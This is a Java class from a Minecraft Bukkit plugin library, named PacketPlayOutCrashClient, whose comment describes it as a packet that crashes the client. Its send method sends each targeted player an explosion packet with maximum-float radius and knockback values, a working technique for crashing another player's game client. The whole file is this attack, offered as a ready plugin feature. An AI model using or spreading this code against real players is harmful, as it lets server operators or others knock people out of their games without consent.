package com.minecraft.moonlake.nms.packet;

import com.minecraft.moonlake.nms.packet.exception.PacketException;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;

import java.util.ArrayList;

/**
 * <h1>PacketPlayOutCrashClient</h1>
 * 数据包输出崩溃客户端（详细doc待补充...）
 *
 * @version 1.0
 * @author Month_Light
 */
public class PacketPlayOutCrashClient extends PacketAbstract<PacketPlayOutCrashClient> {

    public PacketPlayOutCrashClient() {

    }

    @Override
    public void send(Player... players) throws PacketException {

        for(final Player player : players) {

            PacketPlayOutExplosion packetPlayOutExplosion = new PacketPlayOutExplosion(player.getLocation(), Float.MAX_VALUE, new ArrayList<>(), new Vector(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE));
            packetPlayOutExplosion.send(player);
        }
    }
}
